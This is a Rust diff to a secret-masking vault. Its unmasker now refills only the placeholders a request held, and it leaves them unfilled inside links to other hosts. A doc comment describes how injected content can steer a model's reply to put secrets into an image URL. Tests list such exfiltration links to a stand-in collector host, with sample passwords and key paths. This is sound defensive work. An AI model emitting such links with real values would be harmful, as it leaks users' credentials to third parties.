@@ -1373,30 +1373,44 @@ impl Vault {
         self.entries.is_empty()
     }
 
-    /// An unmasker for a reply that arrives in pieces. It owns a copy of
-    /// the placeholder table, so it can outlive a lock on the vault.
-    pub fn stream(&self) -> StreamUnmasker {
+    /// An unmasker for the reply to `request`, which arrives in pieces. It
+    /// owns a copy of the placeholders, so it can outlive a lock on the
+    /// vault: of those that `request` contains, and no others. A reply that
+    /// names a placeholder it was never sent (they are numbered, so easy to
+    /// guess) gets that text back as it is, not a value from another host.
+    pub fn stream_for(&self, request: &str) -> StreamUnmasker {
         StreamUnmasker {
-            values: self
-                .entries
-                .iter()
-                .map(|(token, entry)| (token.clone(), entry.value.clone()))
+            values: TOKEN
+                .find_iter(request)
+                .filter_map(|found| {
+                    let entry = self.entries.get(found.as_str())?;
+                    Some((found.as_str().to_owned(), entry.value.clone()))
+                })
                 .collect(),
             held: String::new(),
         }
     }
 }
 
-/// Unmasks streamed text. A placeholder may be split across chunks, so text
-/// from a possible placeholder start (`<` or `<<...`) is held back until the
-/// placeholder is complete or it is clear that it is not one.
+/// The longest run without a space that is looked at as one word.
+const MAX_WORD: usize = 4096;
+
+/// Unmasks streamed text, a whole word at a time: whether a placeholder is
+/// filled in depends on the rest of its word.
+///
+/// A reply is written by a model, and partly by whatever the model read. If
+/// it says `![x](https://elsewhere.example/p.png?v=<<SEC_01>>)`, filling in
+/// the placeholder would put the real secret into an address that a viewer
+/// of the saved reply fetches. So inside a link a placeholder stays as it
+/// is, unless the link goes to the placeholder itself
+/// (`https://<<HOST_01>>/admin`): that is the user's own target.
 pub struct StreamUnmasker {
     values: HashMap<String, String>,
     held: String,
 }
 
 impl StreamUnmasker {
-    fn unmask(&self, text: &str) -> String {
+    fn fill(&self, text: &str) -> String {
         TOKEN
             .replace_all(text, |found: &regex::Captures| {
                 match self.values.get(&found[0]) {
@@ -1407,29 +1421,88 @@ impl StreamUnmasker {
             .into_owned()
     }
 
-    /// Adds a chunk and returns the text that is safe to show now.
+    /// Whether `word` is a link to a host that is itself a placeholder of
+    /// this request, with nothing in front of it that could be the real
+    /// destination: no user part (`https://<<HOST_01>>@elsewhere/`), no
+    /// further name (`https://<<HOST_01>>.elsewhere.example/`).
+    fn links_to_own_host(&self, word: &str) -> bool {
+        let Some(scheme_end) = word.find("://") else {
+            return false;
+        };
+        let before = word[..scheme_end].to_ascii_lowercase();
+        if before.contains("//") || before.contains("www.") {
+            return false;
+        }
+        let rest = &word[scheme_end + 3..];
+        let authority_end = rest.find(['/', '?', '#']).unwrap_or(rest.len());
+        if rest[..authority_end].contains(['@', '\\']) {
+            return false;
+        }
+        let bracket = usize::from(rest.starts_with('['));
+        let Some(token) = TOKEN.find(&rest[bracket..]).filter(|m| m.start() == 0) else {
+            return false;
+        };
+        let known = self.values.contains_key(token.as_str())
+            && (token.as_str().starts_with("<<HOST_") || token.as_str().starts_with("<<DOM_"));
+        let mut after = rest[bracket + token.end()..].chars();
+        known
+            && match after.next() {
+                None => true,
+                Some('.') => !after
+                    .next()
+                    .is_some_and(|c| c.is_alphanumeric() || matches!(c, '<' | '-' | '_')),
+                Some(c) => !(c.is_alphanumeric() || matches!(c, '<' | '-' | '_' | '@' | '%')),
+            }
+    }
+
+    fn word(&self, word: &str) -> String {
+        if !word.contains("<<") {
+            return word.to_owned();
+        }
+        let lower = word.to_ascii_lowercase();
+        let in_link = ["//", "](", "www.", "mailto:", "src=", "href="]
+            .iter()
+            .any(|mark| lower.contains(mark));
+        if in_link && !self.links_to_own_host(word) {
+            return word.to_owned();
+        }
+        self.fill(word)
+    }
+
+    fn words(&self, text: &str) -> String {
+        text.split_inclusive(char::is_whitespace)
+            .map(|word| self.word(word))
+            .collect()
+    }
+
+    /// Adds a chunk and returns the text that is safe to show now: all of
+    /// it up to the last space.
     pub fn push(&mut self, chunk: &str) -> String {
         self.held.push_str(chunk);
-        let cut = match self.held.rfind("<<") {
-            // An opened placeholder without its closing `>>`, still short
-            // enough to become one.
-            Some(start)
-                if !self.held[start..].contains(">>")
-                    && self.held.len() - start <= MAX_TOKEN_LEN =>
-            {
-                start
-            }
-            _ if self.held.ends_with('<') => self.held.len() - 1,
-            _ => self.held.len(),
+        let cut = match self.held.rfind(char::is_whitespace) {
+            Some(at) => at + self.held[at..].chars().next().map_or(1, char::len_utf8),
+            // A run this long without a space is not prose; let it go, but
+            // not through the middle of a placeholder.
+            None if self.held.len() > MAX_WORD => match self.held.rfind("<<") {
+                Some(start)
+                    if !self.held[start..].contains(">>")
+                        && self.held.len() - start <= MAX_TOKEN_LEN =>
+                {
+                    start
+                }
+                _ if self.held.ends_with('<') => self.held.len() - 1,
+                _ => self.held.len(),
+            },
+            None => 0,
         };
         let ready: String = self.held.drain(..cut).collect();
-        self.unmask(&ready)
+        self.words(&ready)
     }
 
     /// Returns whatever is still held back, at the end of the stream.
     pub fn finish(&mut self) -> String {
         let rest = std::mem::take(&mut self.held);
-        self.unmask(&rest)
+        self.words(&rest)
     }
 }
 
@@ -1884,15 +1957,17 @@ mod tests {
         let reply = "Block <<HOST_01>> at the edge; <<DOM_01>> serves a < b and x << 3 >> y; unknown <<HOST_77>>.";
         let expected = "Block 10.0.0.5 at the edge; app.lab.local serves a < b and x << 3 >> y; unknown <<HOST_77>>.";
 
+        // The request held both placeholders.
+        let request = "about <<HOST_01>> and <<DOM_01>>";
         // Every possible split into two chunks, and byte-at-a-time.
         for cut in 0..=reply.len() {
-            let mut stream = vault.stream();
+            let mut stream = vault.stream_for(request);
             let mut out = stream.push(&reply[..cut]);
             out.push_str(&stream.push(&reply[cut..]));
             out.push_str(&stream.finish());
             assert_eq!(out, expected, "cut at {cut}");
         }
-        let mut stream = vault.stream();
+        let mut stream = vault.stream_for(request);
         let mut out = String::new();
         for ch in reply.chars() {
             let piece = stream.push(&ch.to_string());
@@ -1906,8 +1981,8 @@ mod tests {
         out.push_str(&stream.finish());
         assert_eq!(out, expected);
 
-        // A lone "<<" that never closes is released once it is too long.
-        let mut stream = vault.stream();
+        // A lone "<<" that never closes is released with its word.
+        let mut stream = vault.stream_for(request);
         let mut out = stream.push("shift <<");
         assert_eq!(out, "shift ");
         out.push_str(&stream.push(" by a very long expression that is no placeholder"));
@@ -1915,6 +1990,88 @@ mod tests {
         assert_eq!(
             out,
             "shift << by a very long expression that is no placeholder"
+        );
+        // A run without any space is let go once it is long, whole
+        // placeholders only.
+        let mut stream = vault.stream_for(request);
+        let long = format!(
+            "{}<<HOST_01>>{}",
+            "a".repeat(MAX_WORD),
+            "b".repeat(MAX_WORD)
+        );
+        let mut out = String::new();
+        for piece in long.as_bytes().chunks(7) {
+            out.push_str(&stream.push(std::str::from_utf8(piece).unwrap()));
+        }
+        out.push_str(&stream.finish());
+        assert_eq!(out, long.replace("<<HOST_01>>", "10.0.0.5"));
+    }
+
+    #[test]
+    fn a_reply_gets_back_only_what_its_request_held() {
+        let mut vault = Vault::ephemeral();
+        vault.register(Kind::Host, "10.0.0.5");
+        vault.register(Kind::Sec, "hunter2-from-another-host");
+        vault.register(Kind::User, "auditor");
+        // The request named the host only; the reply guesses at the rest.
+        let mut stream = vault.stream_for("{\"address\":\"<<HOST_01>>\"}");
+        let mut out = stream.push("On <<HOST_01>> try <<SEC_01>> as <<USER_01>> and <<SEC_02>>.");
+        out.push_str(&stream.finish());
+        assert_eq!(
+            out,
+            "On 10.0.0.5 try <<SEC_01>> as <<USER_01>> and <<SEC_02>>."
+        );
+    }
+
+    #[test]
+    fn a_placeholder_inside_a_link_to_elsewhere_is_not_filled_in() {
+        let mut vault = Vault::ephemeral();
+        vault.register(Kind::Host, "10.0.0.5");
+        vault.register(Kind::Dom, "vpn.victim-corp.internal");
+        vault.register(Kind::Sec, "Winter2026!x");
+        vault.register(Kind::Path, "/home/auditor/loot/id_rsa");
+        let request = "<<HOST_01>> <<DOM_01>> <<SEC_01>> <<PATH_01>>";
+        let unmask = |reply: &str| {
+            // Whole, and a byte at a time.
+            let mut stream = vault.stream_for(request);
+            let mut whole = stream.push(reply);
+            whole.push_str(&stream.finish());
+            let mut stream = vault.stream_for(request);
+            let mut pieces = String::new();
+            for ch in reply.chars() {
+                pieces.push_str(&stream.push(&ch.to_string()));
+            }
+            pieces.push_str(&stream.finish());
+            assert_eq!(whole, pieces, "{reply}");
+            whole
+        };
+        // Links, images and attributes that point somewhere else keep their
+        // placeholders, wherever in the address they stand.
+        for hostile in [
+            "![status](https://collector.example/p.png?v0=<<DOM_01>>&v1=<<HOST_01>>&v5=<<SEC_01>>)",
+            "[fix](https://collector.example/<<PATH_01>>)",
+            "[ref]: https://collector.example/?a=<<SEC_01>>",
+            "see https://<<SEC_01>>.collector.example/x and https://<<HOST_01>>.collector.example/",
+            "https://<<HOST_01>>@collector.example/ or https://<<HOST_01>>:<<SEC_01>>@collector.example/",
+            "//collector.example/?u=http://<<HOST_01>>/",
+            "https://collector.example/?next=https://<<HOST_01>>/",
+            "<img src=//collector.example/<<SEC_01>>>",
+            "www.collector.example/<<SEC_01>>",
+            "![x](//collector.example/<<SEC_01>>)",
+            "https://<<SEC_01>>/",
+        ] {
+            let shown = unmask(hostile);
+            assert_eq!(shown, hostile, "nothing may be filled in");
+        }
+        // A link to the target itself is the user's own, and plain text
+        // gets its values back.
+        assert_eq!(
+            unmask("Open https://<<HOST_01>>/admin and http://<<DOM_01>>:8443/login?next=<<PATH_01>>, then http://[<<HOST_01>>]/."),
+            "Open https://10.0.0.5/admin and http://vpn.victim-corp.internal:8443/login?next=/home/auditor/loot/id_rsa, then http://[10.0.0.5]/."
+        );
+        assert_eq!(
+            unmask("The password <<SEC_01>> opened <<PATH_01>> on <<HOST_01>> (<<DOM_01>>)."),
+            "The password Winter2026!x opened /home/auditor/loot/id_rsa on 10.0.0.5 (vpn.victim-corp.internal)."
         );
     }
 
